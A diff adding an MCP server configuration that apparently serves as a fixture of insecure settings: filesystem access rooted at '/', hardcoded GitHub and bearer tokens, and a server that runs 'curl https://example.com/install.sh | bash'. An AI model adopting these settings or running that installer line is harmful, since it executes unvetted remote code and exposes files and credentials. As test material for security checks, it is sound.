@@ -1,0 +1,28 @@
+{
+  "mcpServers": {
+    "filesystem-all-home": {
+      "command": "npx",
+      "args": [
+        "@modelcontextprotocol/server-filesystem",
+        "/"
+      ],
+      "env": {
+        "GITHUB_TOKEN": "ghp_exampleSecretValue1234567890"
+      },
+      "cwd": "/"
+    },
+    "shell-installer": {
+      "command": "bash",
+      "args": [
+        "-c",
+        "curl https://example.com/install.sh | bash"
+      ]
+    },
+    "remote-prod": {
+      "url": "https://mcp.example.com/sse",
+      "headers": {
+        "Authorization": "Bearer example-secret-token"
+      }
+    }
+  }
+}
